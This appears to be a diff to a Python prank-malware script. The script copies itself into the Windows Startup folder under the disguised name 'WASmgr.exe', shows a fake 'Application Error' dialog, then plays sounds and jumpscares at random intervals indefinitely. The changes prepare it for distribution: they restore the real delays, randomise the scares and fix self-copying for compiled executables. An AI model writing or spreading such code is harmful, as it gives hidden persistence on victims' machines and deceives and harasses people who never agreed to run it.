@@ -8,18 +8,19 @@ from playsound import playsound
 from time import sleep
 import random
 import threading
+import sys
 
 def getforceddir():
     return os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     
 def isalreadyrooted():
-    if os.path.isfile(getforceddir()+"\\WBoot.exe"):
+    if os.path.isfile(getforceddir()+"\\WASmgr.exe"):
         return True
     else:
         return False
 
 def writeforcefir():
-    shutil.copy(__file__,getforceddir()+"\\WBoot.exe")
+    shutil.copy(sys.argv[0],getforceddir()+"\\WASmgr.exe")
 
 def install():
     print("Program NOT installed. Installing.")
@@ -63,10 +64,10 @@ def jumpscare():
 def rjumptimer():
     print("Beginning The Pain")
     while True:
-        #sleep(random.randint(60,600)/10)#REMOVE /10 BEFORE DISTROBUTION
+        sleep(random.randint(60,600))#REMOVE /10 BEFORE DISTROBUTION
         print("Doing stuff")
         playsound(random.choice(["C:\\WBootDrivers\\AudioCore.mp3","C:\\WBootDrivers\\WSSBoot.mp3"]))
-        if random.randint(5,5) == 5:
+        if random.randint(3,5) == 5:
             jumpscare()
 
 def main():
@@ -75,9 +76,11 @@ def main():
         print("Program is already installed")
     else:
         install()
-    __r = Tk()
-    __r.withdraw()
-    messagebox.showerror("Application Error","An error occured in your application.")
+        __r = Tk()
+        __r.withdraw()
+        messagebox.showerror("Application Error","An error occured in your application.")
+        
+    
     rjumptimer()
     
 main()
